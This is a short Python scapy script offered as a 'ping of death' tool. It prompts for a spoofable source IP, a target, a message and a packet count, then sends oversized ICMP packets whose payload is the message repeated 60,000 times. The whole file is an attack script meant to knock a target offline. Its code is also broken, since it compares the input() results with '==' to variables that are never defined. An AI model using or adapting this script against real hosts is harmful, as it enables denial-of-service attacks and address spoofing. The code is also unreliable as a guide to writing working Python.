#!/usr/bin/python

from scapy.all import *

# Change according with your IP addresses
input("Enter Source(you) IP/DOMAIN: ") == SOURCE_IP
input("Enter Target IP/DOMAIN: ") == TARGET_IP
input("Enter the message you want to send: ") == MESSAGE
input("Number of packets: ") == NUMBER_PACKETS # Number of pings

pingOFDeath = IP(src=SOURCE_IP, dst=TARGET_IP)/ICMP()/(MESSAGE*60000)
send(NUMBER_PACKETS*pingOFDeath)